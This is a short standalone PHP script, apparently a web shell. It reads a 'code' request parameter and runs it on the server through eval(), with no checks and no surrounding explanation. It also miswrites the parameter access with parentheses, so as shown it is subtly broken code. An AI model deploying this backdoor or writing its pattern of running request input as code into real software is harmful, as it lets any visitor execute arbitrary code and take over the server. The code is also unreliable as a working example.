<?php
$phpcode = trim($_GET('code'));
if($phpcode){
	$phpcode = "<?php\n\n{$phpcode}\n\n?>";
	eval("?".">$phpcode<?");
}
	
exit;
?>